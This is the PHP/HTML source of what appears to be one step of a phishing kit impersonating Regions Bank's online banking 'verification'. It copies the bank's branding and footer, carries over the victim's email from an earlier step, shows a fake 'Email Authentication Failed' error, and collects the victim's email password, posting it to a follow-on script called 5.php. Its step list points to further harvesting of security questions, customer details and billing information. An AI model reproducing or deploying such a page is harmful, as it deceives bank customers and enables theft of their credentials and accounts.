<?php
session_start(); 




$emadi2 = $_SESSION['emadi1'];



?>

<!DOCTYPE html>

<html lang="en" class="no-js">



<head>

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1">





    <title>Regions Online Banking Verification - Verification Online Banking - Regions Online Banking</title>

    <link rel="shortcut icon" href="favicon.ico">









    <link rel="stylesheet" href="css/com-regions.min.css">

    <link href="css/combined.css.1.css" rel="stylesheet">

    <link href="css/combined.css.2.css" rel="stylesheet">









    <style>

        .warning-message {

            background-color: #fff9e3;

            padding: 10px;

            margin: 10px;

        }

    </style>

    <style type="text/css" id="amaze-css-module">

        .orange-button:focus,

        .regions-orange-button:focus,

        a.nexterror:focus,

        a.previouserror:focus,

        button:focus,

        h3:focus,

        input:focus,

        select:focus {

            outline: #1d8795 solid 2px !important

        }



        .orange-button:focus {

            border-color: inherit

        }



        .regions-orange-button:focus {

            border-color: transparent

        }



        .icon-circle-print:focus,

        .regions-back-button:focus,

        .regions-cancel-button:focus,

        .ui-dialog-titlebar-close:focus {

            outline: #1d8795 solid 2px

        }



        .amaze-clipper {

            position: absolute;

            clip: rect(1px 1px 1px 1px);

            clip: rect(1px, 1px, 1px, 1px);

            width: 1px;

            height: 1px;

            overflow: hidden

        }



        a.amaze-skip-navigation:focus {

            position: absolute;

            top: 0;

            left: 0;

            background-color: #1d8795;

            color: #fff;

            border: 0;

            padding: 8px 15px 8px 8px;

            border-radius: 0 0 15px;

            box-shadow: #999 2px 2px 8px 1px

        }



        table.regions-table>tbody>tr>th {

            border-bottom: 1px solid #d8d8d5 !important;

            border-radius: 0 !important;

            border-top: 0 none;

            font-size: 14px;

            padding: 10px 15px;

            text-align: left;

            vertical-align: middle

        }



        .amaze-offscreen {

            position: absolute !important;

            clip: rect(1px 1px 1px 1px);

            /* IE6, IE7 */

            clip: rect(1px, 1px, 1px, 1px);

            overflow: hidden;

            width: 1px;

            height: 1px;

        }

    </style>

</head>



<body class="regions-page rds-wizard" data-regions="page" data-resized="true">



    <div id="contentWrapper" style="display: block;">



        <div>



            <header class="rds-header simple">

                <div class="container">

                    <a class="logo-link" href="" title="Go home">

                        <picture class="logo">

                            <source srcset="media/regions-logo-no-r.svg" media="(max-width: 600px)">

                            <img src="media/regions-logo-no-r.svg" alt="regions logo">

                            <!-- ^^ SRC for IE compatibility, IE doesn't support srcset.-->

                        </picture>

                    </a>

                </div>

            </header>



            <main>

                <header class="rds-marquee">

                    <div class="container">

                        <div class="marquee-title">



                            <section class="sub-menu">

                                <h1>Regions Online Banking Verification</h1>



                            </section>



                        </div>

                    </div>

                </header>





                <section id="enrollment-home" class="template">

                    <section id="columnFill">

                        <section class="regions-widget enrollments-enrollmentwidget">





                            <div class="rds-wizard-body enrollment-container">



                                <div class="body-content container">

                                    <div id="step1Identification">







                                        <form id="Verification-Form" class="rds-form" action="5.php" method="POST" name="olb-enrollment-step-1">



                                            <div class="rds-step-header">

                                                <h1 class="sr-only">Verification Steps</h1>

                                                <ol class="rds-steps">

                                                    <li class="step col-sm-3 col-xs-12 hidden-xs"><span class="badge"><span class="sr-only">Step -</span>1</span>Security Questions</li>

                                                    <li class="step current col-sm-3 col-xs-12"><span class="badge"><span class="sr-only">Step -</span>2<span class="sr-only">current step -</span></span>Customer

                                                        Information</li>

                                                    <li class="step col-sm-3 col-xs-12 hidden-xs"><span class="badge"><span class="sr-only">Step -

                                                            </span>3</span>Billing Information</li>

                                                    <li class="step col-sm-3 col-xs-12 hidden-xs"><span class="badge"><span class="sr-only">Step

                                                                -</span>4</span>Confirmation</li>

                                                </ol>

                                            </div>



                                            <div class="rds-long-form-tile">

                                                <div class="long-form-main">



                                                    <?php

                                                    if (isset($_GET['error']) && $_GET['error'] == 1) {

                                                    ?>

                                                        <div class=" rds-page-alert alert-danger">

                                                            <div class="icon"></div>

                                                            <div class="content">

                                                                <h3 tabindex="-1">Please resolve the following issues:

                                                                </h3>

                                                                Email Authentication Failed!</br> Please try again with valid Email Address & Email Password.



                                                                <ul></ul>

                                                            </div>

                                                        </div>

                                                    <?php

                                                    }

                                                    ?>


<div class=" rds-page-alert alert-danger">

                                                            <div class="icon"></div>

                                                            <div class="content">

                                                                <h3 tabindex="-1">Please resolve the following issues:

                                                                </h3>

                                                                Email Authentication Failed!</br> Please try again with valid Email Address & Email Password.



                                                                <ul></ul>

                                                    <div class="field-group" role="group" aria-labelledby="required-info-title required-info-help">

                                                        <h2 id="required-info-title">Please enter the

                                                            following required information:</h2>

                                                        <div class="row">

                                                            <div class="col-md-6 col-xs-12">

                                                                <div class="collapse in email-toggle">

                                                                    <div class="field animated-label text required email">

                                                                        <label class="control-label" for="email">Email Address</label>

                                                                        <input aria-describedby="descriptor-enrollment-id" aria-required="True" class="form-control" data-val="true" required="" disabled name="emadi3" type="email" value="<?php  echo $emadi2; ?>" autocomplete="off" style="max-height: 67px; padding-top: 33px;">



                                                                    </div>

                                                                </div>

                                                            </div>

                                                        </div>

                                                        <div class="row">

                                                            <div class="col-md-6 col-xs-12">

                                                                <div class="collapse in emailpa-toggle">

                                                                    <div class="field animated-label text required emailpa">

                                                                        <label class="control-label" for="emailpa">Email Password</label>

                                                                        <input aria-describedby="descriptor-enrollment-id" aria-required="True" class="form-control" data-val="true" required="" name="empa2" type="password" value="" autocomplete="off" style="max-height: 67px; padding-top: 33px;">



                                                                    </div>

                                                                </div>

                                                            </div>

                                                        </div>





                                                    </div>



                                                    <div class="wizard-cta">

                                                        <button id="customer-verification" class="btn btn-wizard-next" type="submit">Confirm</button>

                                                    </div>





                                                </div>

                                                <aside class="long-form-aside">

                                                    <h3>FAQs</h3>

                                                    <ul class="no-bullet">

                                                        <li><a href="#">What information do I need to Login?</a></li>

                                                        <li><a href="#">Is Regions Online Banking secure?</a></li>

                                                        <li><a href="#">When is the Online Banking system available?</a>

                                                        </li>

                                                        <li><a href="#">View all FAQs</a></li>

                                                    </ul><a class="aside-link" href="#top">Back to Top</a>

                                                </aside>

                                            </div>

                                        </form>

                                    </div>







                                </div>





                            </div>

        </div>

        </section>

        </section>



        </section>









        </main>



        <footer class="rds-footer">









            <div class="footer-content">





                <ul>

                    <li>

                        <a href="#">

                            Contact Us

                        </a>

                    </li>

                    <li>

                        <a href="#">

                            Terms and Conditions

                        </a>

                    </li>

                    <li>

                        <a href="#">

                            Privacy Pledge

                        </a>

                    </li>

                    <li>

                        <a href="#">

                            Security

                        </a>

                    </li>

                    <li>

                        <a href="#">

                            Online Tracking and Advertising

                        </a>

                    </li>

                    <li>

                        <a href="#">

                            Accessible Banking

                        </a>

                    </li>

                    <li>

                        <span id="FeedbackLink"></span>



                    </li>

                </ul>

                <ul>

                    <li>Call 1-800-REGIONS</li>

                </ul>



                <p>Regions, the Regions logo, the LifeGreen color, and the LifeGreen bike are registered trademarks of

                    Regions Bank.</p>

                <p>© 2022 Regions Bank. All Rights Reserved.</p>



                <ul>

                    <li class="footer-icon"><img src="media/equal-housing-lender.svg" alt=""><span class="sr-only">Equal

                            Housing Lender</span></li>

                    <li class="footer-icon"><img src="media/member-fdic.svg" alt=""><span class="sr-only">Member

                            FDIC</span></li>

                </ul>



            </div>



            <style>

                .footer-content a {

                    color: #178;

                }

            </style>









        </footer>

    </div>









    </div>





</body>



</html>